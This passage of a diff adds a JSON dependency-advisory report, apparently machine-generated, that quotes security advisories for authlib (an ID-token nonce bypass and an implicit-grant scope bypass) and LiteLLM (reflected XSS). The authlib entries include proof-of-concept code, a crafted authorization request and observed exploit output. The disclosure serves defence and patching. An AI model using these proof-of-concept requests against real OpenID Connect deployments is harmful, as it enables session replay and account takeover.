nonce_supported=flag)}\n    try:\n        user = rp.parse_id_token(tok, nonce=SESSION_NONCE)\n        print(f\"{label:34s} -> ACCEPTED sub={user['sub']}\")\n    except Exception as e:\n        print(f\"{label:34s} -> REJECTED {type(e).__name__}: {e}\")\n```\n\n## Expected result\n\nAll three cases carry a nonce that does not match the relying party's session nonce, so all three should be rejected.\n\n## Observed result\n\n```\n[1] no nonce_supported claim       -> REJECTED InvalidClaimError: invalid_claim: Invalid claim: 'nonce'\n[2] nonce_supported: false         -> ACCEPTED sub=victim\n[3] nonce_supported: \"false\"       -> REJECTED InvalidClaimError: invalid_claim: Invalid claim: 'nonce'\n```\n\nCase [1] shows nonce validation rejecting a mismatched nonce under normal conditions. Case [2] differs from case [1] only by the addition of the `nonce_supported` claim and is accepted, returning the subject of the replayed token. Case [3] confirms the branch requires a JSON boolean.\n\nThe script exits 0 and produces identical output across three runs.\n\n### Impact\n\n## Type of vulnerability\n\nReliance on an untrusted input in a security decision (CWE-807), resulting in authentication bypass by capture-replay (CWE-294).\n\nThe nonce binds an ID token to the browser session that requested it and is the control that prevents a token issued for one session being presented in another. Because the flag that governs this check is read from the token itself, the check can be disabled by the data it is applied to.\n\n## Who is impacted\n\nOpenID Connect relying parties built on authlib's client integrations where an attacker can supply an ID token to `parse_id_token()`:\n\n- Implicit flow relying parties, where the ID token is returned in the URL fragment.\n- Hybrid flow relying parties, where the ID token is returned in the fragment or by form post.\n- Applications calling `parse_id_token()` directly on externally supplied input.\n\nBoth the synchronous and asynchronous integrations are affected, so Flask, Django and Starlette deployments are equally exposed.\n\nRelying parties using plain authorization code flow are not impacted, as the ID token is retrieved from the token endpoint over TLS following a `state` lookup and cannot be substituted by an attacker.\n\n## Consequence\n\nAn attacker in possession of a victim's ID token replays it into their own session. Nonce validation is skipped, `parse_id_token()` returns a `UserInfo` for the victim's subject, and the relying party establishes an authenticated session as the victim. This grants access to the victim's account at that relying party, including any data and actions available through it.\n\nThe token must carry a valid signature and pass `iss` and `aud` validation, so the vulnerability does not permit forging tokens or authenticating as an arbitrary subject. It removes the replay protection from a genuine token that has been captured, for example from browser history, a `Referer` header, proxy or server logs, or a shared device.\n\n## Mitigation available to integrators\n\nNone. The check is performed inside `parse_id_token()`, and no parameter or configuration option is exposed to disable the behaviour or to override the nonce handling.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-10-27T15:39:13Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "authlib"
+        ],
+        "affected_ranges": [
+          "0..1.9.0",
+          "0..∞"
+        ],
+        "references": [
+          "https://github.com/authlib/authlib/security/advisories/GHSA-c5mf-xmp2-59rc",
+          "https://nvd.nist.gov/vuln/detail/CVE-2026-114617",
+          "https://github.com/authlib/authlib/pull/949",
+          "https://github.com/authlib/authlib/commit/6563f6f7a8c2f71d2f85ee7511d72a4fbae3acc0",
+          "https://github.com/authlib/authlib",
+          "https://github.com/authlib/authlib/releases/tag/v1.9.0"
+        ]
+      },
+      "repo": "ianlintner/caretaker",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'authlib' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "GHSA-q686-2qmg-hqc7",
+        "source": "osv",
+        "title": "Authlib: OpenID implicit grant checks raw scope instead of allowed scope before issuing ID tokens",
+        "summary": "## Report metadata\n\n| Field | Value |\n| --- | --- |\n| Package | `authlib` (PyPI, `pkg:pypi/authlib`) |\n| Repository | https://github.com/authlib/authlib |\n| Component | `authlib.oidc.core.grants.implicit.OpenIDImplicitGrant.validate_authorization_request` |\n| Vulnerability class | Authorization bypass: a client's scope restriction is bypassed for OpenID Connect ID token issuance |\n| Verified against | `c529a61af40e3efe05286140e00fbdced07d7987` (v1.8.0). Earlier releases were not checked. |\n| API surface | Public API (`OpenIDImplicitGrant`, registered with `server.register_grant(...)`) |\n| Affected in default configuration | Yes. No non-default option is needed once `OpenIDImplicitGrant` is registered. Client metadata decides exposure: Authlib's standard `ClientMixin` checks response type and scope independently, so a client can be permitted `id_token` responses without being allowed the `openid` scope. |\n\n## Summary\n\n`OpenIDImplicitGrant.validate_authorization_request()` first runs the parent `ImplicitGrant` validation, which filters the requested scope through `client.get_allowed_scope()` and stores the result in `request.scope`. It then decides whether this is an OpenID request by checking the raw, client-supplied `request.payload.scope` instead of that filtered value. A client that is allowed `profile` but not `openid` can therefore request `scope=openid profile`, pass the check, and receive a signed ID token (with `sub` and profile claims) once the user consents. This happens even when Authlib's built-in, scope-filtering `BearerTokenGenerator` is in use.\n\nThe tainted input is the authorization request's `scope` parameter. The OAuth client fully controls it, and the client is the very party the scope restriction is meant to constrain. Any registered client can add `openid` to its request if it is permitted an `id_token` or `id_token token` response type and its allowed scopes exclude `openid` but include a claim-bearing scope such as `profile`.\n\nSibling paths treat the same client correctly, which suggests the raw-scope check is a bug rather than intended behaviour:\n\n- `ImplicitGrant.validate_authorization_request()` -> filters the requested scope through `client.get_allowed_scope()` into `request.scope` (safe, [`authlib/oauth2/rfc6749/grants/implicit.py` lines 141-147](https://github.com/authlib/authlib/blob/c529a61af40e3efe05286140e00fbdced07d7987/authlib/oauth2/rfc6749/grants/implicit.py#L141-L147))\n- `OpenIDImplicitGrant.validate_authorization_request()` -> **checks the raw `request.payload.scope` (unsafe, [`authlib/oidc/core/grants/implicit.py` line 72](https://github.com/authlib/authlib/blob/c529a61af40e3efe05286140e00fbdced07d7987/authlib/oidc/core/grants/implicit.py#L72))**\n- `UserInfoEndpoint` -> rejects the same client's access token with 403 `insufficient_scope` (safe; observed during verification, line not recorded)\n- OIDC authorization code flow -> issues no `id_token` for the same client (safe; observed during verification, line not recorded)\n\n## Impact\n\nA registered OAuth client that the operator has excluded from the `openid` scope can get an OpenID Connect ID token for any user who logs in and approves its authorization request. During verification the provider returned an RS256-signed ID token carrying `iss`, `aud` (the requesting client), `nonce`, `auth_time`, `at_hash`, `sub` and `name`, while the granted scope was only `profile`. A consent page built the way the Authlib docs show lists only `profile`, so the user is not shown that an identity token will be issued.\n\nWithout this bug, the same request fails with `InvalidScopeError` (\"Missing 'openid' scope\") because the client's resolved scope does not include `openid`. The new capability is the ID token itself: a signed assertion of the user's identity (`sub`) plus claims from the client's other allowed scopes. Gating that token is exactly what the `openid` scope is for. The access token stays restricted when the built-in token generator is used: Authlib's `UserInfoEndpoint` rejects it with 403 `insufficient_scope`.\n\n**Scoring note:** we did not compute a CVSS score. An initial triage rated this High. After dynamic verification we assess practical severity as closer to Medium, because:\n\n1. The attacker must be a registered client that is permitted `id_token` response types.\n2. The user must log in and consent.\n3. The ID token's `aud` is the attacking client.\n\nTwo kinds of deployment are not affected:\n\n- Deployments that use only the OIDC authorization code flow. During verification, that flow issued no ID token for the same client.\n- Deployments where every client permitted an `id_token` or `id_token token` response type is also allowed the `openid` scope.\n\n## Preconditions\n\n1. The authorization server registers `OpenIDImplicitGrant` (or a subclass), e.g. `server.register_grant(MyOpenIDImplicitGrant)`. The vulnerable method runs on every OIDC implicit authorization request.\n2. A client's metadata permits an OIDC implicit response type (`id_token` or `id_token token`). Nothing in Authlib ties this to the `openid` scope. The standard SQLAlchemy `ClientMixin` checks response type and scope independently, and it filters requested scopes against the client's allowed scopes at [`authlib/integrations/sqla_oauth2/client_mixin.py:124-129`](https://github.com/authlib/authlib/blob/c529a61af40e3efe05286140e00fbdced07d7987/authlib/integrations/sqla_oauth2/client_mixin.py#L124-L129).\n3. That client's allowed scopes exclude `openid` but include another claim-bearing scope, such as `profile`.\n4. The attacker controls that registered client and sends an authorization request that adds `openid` to otherwise allowed scopes (e.g. `scope=openid profile`), with a `nonce`.\n5. A user logs in and approves the request.\n6. Branch condition: the raw `request.payload.scope` contains `openid` while the filtered `request.scope` does not. So `is_openid_scope(self.request.payload.scope)` is true at `implicit.py:72` and no `InvalidScopeError` is raised.\n\nNo non-standard usage, monkey-patching or unusual configuration is needed: this is the public grant used as intended. Keeping a client's response types and allowed scopes in sync is not documented as the integrator's responsibility. The parent grant stores the filtered `request.scope` specifically so that authorization decisions use it. We did not capture a link to the relevant Authlib docs page, but the verification built its consent page the way those docs show.\n\n## Data flow\n\n1. **Source**: the OAuth client controls the authorization request's `scope` parameter, e.g. `GET /authorize?response_type=id_token%20token&client_id=c&redirect_uri=https%3A%2F%2Fc%2Fcb&scope=openid%20profile&nonce=n`. The raw value remains available as `request.payload.scope`.\n2. **Propagation**: `ImplicitGrant.validate_authorization_request()` filters the requested scope through `client.get_allowed_scope()` and stores the result in `request.scope` (here `'profile'`). `request.payload.scope` still holds the raw `openid profile` ([`authlib/oauth2/rfc6749/grants/implicit.py:141-147`](https://github.com/authlib/authlib/blob/c529a61af40e3efe05286140e00fbdced07d7987/authlib/oauth2/rfc6749/grants/implicit.py#L141-L147)).\n3. **Sink**: `OpenIDImplicitGrant.validate_authorization_request()` uses the raw value to decide whether this is an OpenID request: `if not is_openid_scope(self.request.payload.scope):` ([`authlib/oidc/core/grants/implicit.py:72`](https://github.com/authlib/authlib/blob/c529a61af40e3efe05286140e00fbdced07d7987/authlib/oidc/core/grants/implicit.py#L72)). The injected `openid` satisfies the check, so the method returns the redirect URI instead of raising `InvalidScopeError` ([`authlib/oidc/core/grants/implicit.py:70-84`](https://github.com/authlib/authlib/blob/c529a61af40e3efe05286140e00fbdced07d7987/authlib/oidc/core/grants/implicit.py#L70-L84)).\n4. **Reachability**: `OpenIDImplicitGrant` is the public grant that serves OIDC implicit authorization requests. After the user consents, `create_granted_params()` and `process_implicit_token()` issue the ID token and user claims ([`authlib/oidc/core/grants/implicit.py:112-129`](https://github.com/authlib/authlib/blob/c529a61af40e3efe05286140e00fbdced07d7987/authlib/oidc/core/grants/implicit.py#L112-L129), [`authlib/oidc/core/grants/implicit.py:132-169`](https://github.com/authlib/authlib/blob/c529a61af40e3efe05286140e00fbdced07d7987/authlib/oidc/core/grants/implicit.py#L132-L169)).\n\n## Vulnerable code\n\n`authlib/oidc/core/grants/implicit.py`, lines 70-84 at `c529a61af40e3efe05286140e00fbdced07d7987` (an excerpt; `...` marks code left out of the captured snippet):\n\n```python\nredirect_uri = super().validate_authorization_request()  # safe: parent grant sets the filtered request.scope\nif not is_openid_scope(self.request.payload.scope):  # <-- sink (line 72): raw, client-supplied scope\n    raise InvalidScopeError(\"Missing 'openid' scope\", ...)\n...\nreturn redirect_uri\n```\n\n## Reproduction\n\nVerified two ways on Authlib `c529a61af40e3efe05286140e00fbdced07d7987` (v1.8.0):\n\n- a pytest PoC using the Flask test client\n- a standalone Flask OpenID Provider on localhost, driven with `curl`\n\nThe Python and Flask versions were not recorded.\n\nSetup: a client registered with `scope='profile'` only (no `openid`) and response types `id_token` / `id_token token`. It uses Authlib's built-in SQLAlchemy `ClientMixin` and the built-in scope-filtering `BearerTokenGenerator`.\n\n1. The client sends an authorization request with `scope=openid profile` and a `nonce`.\n2. `ImplicitGrant` sets `request.scope='profile'`. A consent page built the way the docs show displays only `profile`.\n3. `OpenIDImplicitGrant.validate_authorization_request()` checks the raw `request.payload.scope` at line 72, so the request passes.\n4. After the user approves, the provider returns an RS256-signed ID token with `iss`, `aud` (the client), `nonce`, `auth_time`, `at_hash`, `sub` and `name`, while the granted scope is `profile`. The ID token's signature verified against the provider's JWKS.\n\nControls run during verification:\n\n- The same request without `openid` returns `invalid_scope` (\"Missing 'openid' scope\").\n- Authlib's `UserInfoEndpoint` rejects this client's access token with 403 `insufficient_scope`.\n- The OIDC authorization code flow for the same client issues no `id_token`.\n\nThe sketch below shows the request shape against Authlib's Flask OIDC test app. The verification's own test script is not included here.\n\n```python\n# Client metadata: scope='profile' (no openid), response_types=['id_token token'].\nrv = client.get('/authorize?response_type=id_token%20token&client_id=client-id&redirect_uri=https%3A%2F%2Fclient.test%2Fauthorized&scope=openid%20profile&nonce=n')\n# after the user grants consent:\nassert 'id_token=' in rv.headers['Location']  # should have been rejected: openid is not an allowed scope\n```\n\n- **Expected:** `InvalidScopeError` / `invalid_scope` (\"Missing 'openid' scope\"), because the client's resolved allowed scope (`request.scope == 'profile'`) does not include `openid`.\n- **Actual:** after consent, the redirect carries a signed ID token (including `sub` and `name`) while the granted scope is `profile`.\n\n## Suggested remediation\n\nDecide whether to issue OpenID tokens from the scope the grant actually authorized, never from the raw requested scope. The authorized scope is `self.request.scope`, which the parent grant has already filtered through `client.get_allowed_scope()`.\n\n```diff\n redirect_uri = super().validate_authorization_request()\n-if not is_openid_scope(self.request.payload.scope):\n+if not is_openid_scope(self.request.scope):\n     raise InvalidScopeError(\"Missing 'openid' scope\", ...)\n```\n\nDuring verification, this one-line change at line 72 blocked the exploit, and the existing OIDC implicit/hybrid tests still passed (23 passed).\n\nThe same rule should hold for the rest of OIDC issuance. `create_granted_params()` ([`authlib/oidc/core/grants/implicit.py:112-129`](https://github.com/authlib/authlib/blob/c529a61af40e3efe05286140e00fbdced07d7987/authlib/oidc/core/grants/implicit.py#L112-L129)) passes the raw `payload.scope` to `generate_token`. It should pass `self.request.scope` instead.\n\nNotes:\n\n- **Adjacent raw-scope use, worth fixing in the same change:** `create_granted_params()` hands the raw `payload.scope` to `generate_token`. So a deployment whose custom token generator does not filter scope also grants the client access-token scopes it is not allowed; verification noted `openid` and `email`. Authlib's built-in `BearerTokenGenerator` re-filters the access-token scope, so this only shows up with a non-filtering generator. That re-filtering does not stop the ID token.\n- **Other paths through the same raw value:** beyond `create_granted_params()`, we did not audit every scope read in `process_implicit_token()` ([`authlib/oidc/core/grants/implicit.py:132-169`](https://github.com/authlib/authlib/blob/c529a61af40e3efe05286140e00fbdced07d7987/authlib/oidc/core/grants/implicit.py#L132-L169)), or in other OIDC grants such as the hybrid grant. Whether they share the pattern is not verified.\n- **Already safe, no change needed:**\n  - the scope filtering in the parent `ImplicitGrant` and in `ClientMixin`\n  - `UserInfoEndpoint`, which rejects this client's access token with 403 `insufficient_scope`\n  - the OIDC authorization code flow, which issues no ID token for this client\n\nSuggested regression test, alongside the existing Flask OIDC implicit-grant tests:\n\n1. Register a client with `scope='profile'` and `response_types=['id_token token']`.\n2. Send an authorization request with `scope=openid profile` and a `nonce`, and approve it.\n3. Assert that the response is an `invalid_scope` error (\"Missing 'openid' scope\") and that the redirect contains no `id_token`.\n\nA second case should use a token generator that does not filter scope, and assert that the issued access token carries only the client's allowed scopes.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-10-27T15:38:53Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "authlib"
+        ],
+        "affected_ranges": [
+          "0..1.9.0",
+          "0..∞"
+        ],
+        "references": [
+          "https://github.com/authlib/authlib/security/advisories/GHSA-q686-2qmg-hqc7",
+          "https://nvd.nist.gov/vuln/detail/CVE-2026-114619",
+          "https://github.com/authlib/authlib/pull/945",
+          "https://github.com/authlib/authlib/commit/e3bd41cb29dcfee434453b135ffb487884baeedf",
+          "https://github.com/authlib/authlib",
+          "https://github.com/authlib/authlib/releases/tag/v1.9.0"
+        ]
+      },
+      "repo": "ianlintner/caretaker",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'authlib' named in advisory"
+    },
+    {
+      "advisory": {
+        "id": "GHSA-hhww-mrg2-969h",
+        "source": "osv",
+        "title": "LiteLLM vulnerable to reflected XSS in /sso/debug/callback",
+        "summary": "### Summary\n\nThe `/sso/debug/callback` endpoint reflected identity-provider-controlled fields into an inline `<script>` block via `json.dumps`, which escapes JSON string syntax but not HTML context characters such as `</script>`. An IdP-returned string field containing `</script>` (for example a user-editable display name) closed the script block and executed attacker JavaScript in the proxy's origin.\n\n### Impact\n\nReflected XSS on the LiteLLM proxy origin. The route required no authentication, so an attacker with an account on the configured IdP whose claims pass such strings through verbatim could complete the SSO flow themselves and deliver the resulting callback URL to a logged-in proxy admin. Scripts executing in the proxy origin can read the dashboard session cookie and act with the victim's privileges, up to full admin account takeover.",
+        "severity": "unknown",
+        "cvss": null,
+        "published": "2026-10-27T15:31:56Z",
+        "ecosystem": "pypi",
+        "affected_packages": [
+          "litellm"
+        ],
+        "affected_ranges": [
+          "0..1.85.0",
+          "1.65.5..∞"
+        ],
+        "references": [
+          "https://github.com/BerriAI/litellm/security/advisories/GHSA-hhww-mrg2-969h",
+          "https://github.com/BerriAI/litellm/pull/27498",
+          "https://github.com/BerriAI/litellm/commit/13a193367f0ae2e7e8b29913e0d23a32d3bb0457",
+          "https://github.com/BerriAI/litellm",
+          "https://github.com/BerriAI/litellm/releases/tag/v1.85.0"
+        ]
+      },
+      "repo": "ianlintner/caretaker",
+      "severity": "unknown",
+      "relevance": "direct",
+      "rationale": "declared dep 'litellm' named in advisory"
+    }
+  ],
+  "feed_counts": {
+    "nvd": 200,
+    "osv": 14,
+    "ghsa": 100
+  },
+  "repos_scanned": 9
+}
